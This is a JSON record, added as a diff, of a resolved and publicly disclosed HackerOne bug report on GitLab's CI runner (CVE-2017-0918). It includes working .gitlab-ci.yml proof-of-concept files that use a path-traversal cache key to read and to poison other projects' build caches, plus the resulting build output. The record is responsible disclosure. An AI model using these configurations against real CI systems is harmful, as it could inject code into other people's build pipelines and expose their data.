@@ -1,0 +1,135 @@
+{
+  "id": 301432,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE0MzI=",
+  "url": "https://hackerone.com/reports/301432",
+  "title": "GitLab CI runner can read and poison cache of all other projects",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-30T18:58:16.329Z",
+  "submitted_at": "2017-12-30T18:58:16.329Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-0918"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-04-27T02:21:50.009Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-04-25T23:40:32.633Z",
+  "team_member_agreed_on_going_public_at": "2018-04-27T02:21:49.915Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The GitLab CI runner allows users to cache files and directories in between runs. These files are stored in a ZIP file and uploaded to a shared cache instance. In my testing, the files were uploaded to `runners-cache-4-internal.gitlab.com` and `runners-cache-3-internal.gitlab.com`, even for dedicated runners. It seems odd that dedicated runners use the same shared cache, but perhaps that was an intentional design decision. It could also be a vulnerability. I tried reaching the cache servers from a Docker instance itself, but wasn't able to (I tried from a reverse shell spawned from a Docker instance). There are multiple vulnerabilities (same root cause though) that can be chained to successfully poison the CI runner cache of another project.\n\n**Reading the cache of other projects**\nCreate a new project with a `.gitlab-ci.yml` file in it. The file should contain the following contents. By default, when a cache file is downloaded, it'll download the cache from http://runners-cache-4-internal.gitlab.com:444/runner/project/5024150/cache.\n\n**.gitlab-ci.yml**\n```\na:\n  script:\n  - ls -lashR\n  cache:\n    key: ../1/cache\n    policy: pull\n    paths:\n      - .\n```\n\nTo read the cache, the attacker needs to know two things: a project ID (auto incremental) and a cache key. By default, the project ID will be prepended to download the cache. But because it's an HTTP request and there's no additional checks on the `key` input, a path traversal vulnerability can be exploited to move up a directory and select the cache from a different project. In this case, when it downloads the cache, it'll request http://runners-cache-4-internal.gitlab.com:444/runner/gitlab/project/1/cache instead of the project ID of the build.\n\n**Build output**\n```\n\u001b[0KRunning with gitlab-runner 10.3.0 (5cf5e19a)\n  on docker-auto-scale (e11ae361)\n\u001b[0;m\u001b[0KUsing Docker executor with image ruby:2.1 ...\n\u001b[0;m\u001b[0KUsing docker image sha256:4eadb9b5cb46f487a71d05717762679404f7f6fdec1ba4fa96304de1db07dfef for predefined container...\n\u001b[0;m\u001b[0KPulling docker image ruby:2.1 ...\n\u001b[0;m\u001b[0KUsing docker image ruby:2.1 ID=sha256:223d1eaa9523fa64e78f5a92b701c9c11cbc507f0ff62246dbbacdae395ffea3 for build container...\n\u001b[0;msection_start:1514659811:prepare_script\n\u001b[0KRunning on runner-e11ae361-project-4989754-concurrent-0 via runner-e11ae361-srm-1514658950-a15d8859...\nsection_end:1514659812:prepare_script\n\u001b[0Ksection_start:1514659813:get_sources\n\u001b[0K\u001b[32;1mCloning repository...\u001b[0;m\nCloning into '/builds/jobertabma/build-test'...\n\u001b[32;1mChecking out e01918e5 as master...\u001b[0;m\n\u001b[32;1mSkipping Git submodules setup\u001b[0;m\nsection_end:1514659814:get_sources\n\u001b[0Ksection_start:1514659814:restore_cache\n\u001b[0K\u001b[32;1mChecking cache for ../13083/ruby-235-with-yarn...\u001b[0;m\nDownloading cache.zip from http://runners-cache-5-internal.gitlab.com:444/runner/project/13083/ruby-235-with-yarn\u001b[0;m \n\u001b[32;1mSuccessfully extracted cache\u001b[0;m\nsection_end:1514659844:restore_cache\n```\n\nThe cache key seems to be guessable pretty easily or even unused when no key is specified, since most will correlate with the step they're executed in. When I started looking at this, I had to specify which paths to download from the cache. This made exploitation more difficult. However, it (conveniently) allowed me to use `.` as path, extracting all files from the cache into the working directory. Running `ls -lashR` after that reveals the cache contents in the build output. Files can be read using `cat` or to store them as build artifacts through the `.gitlab-ci.yml`.\n\n**Writing the cache of other projects**\nNow that the attacker knows what files are stored in the cache, it can poison the cache with its own file contents. Create another CI YAML file with the following contents:\n\n**.gitlab-ci.yml**\n```\na:\n  script:\n  - echo 1 > file-to-poison\n  cache:\n    key: ../1/cache\n    policy: push\n    paths:\n      - file-to-poison\n```\n\nThe attacker has to run a build, which will overwrite the `file-to-poison` file in the cache for project ID 1. Now, when the targeted project starts another CI run, the poisoned cache files will be downloaded and used in the CI run. For example, an attacker could poison `13083/ruby-235-with-yarn`, which would overwrite the Ruby 2.3.5 executable that is being used for GitLab CE CI runs. As you can imagine, someone could enumerate over other projects that use cached executables and overwrite them with their own code.\n\nThis has been tested against the latest version of GitLab.\n\n## Impact\n\nDepending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-05-25T23:40:32.704Z",
+  "allow_singular_disclosure_after": -251048634.1460912,
+  "singular_disclosure_allowed": true,
+  "vote_count": 43,
+  "voters": [
+    "oub3ll4",
+    "jokebookservice1",
+    "alexbirsan",
+    "sp1d3rs",
+    "ramsexy",
+    "bull",
+    "muon4",
+    "kapytein",
+    "jobert",
+    "ali",
+    "and 33 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
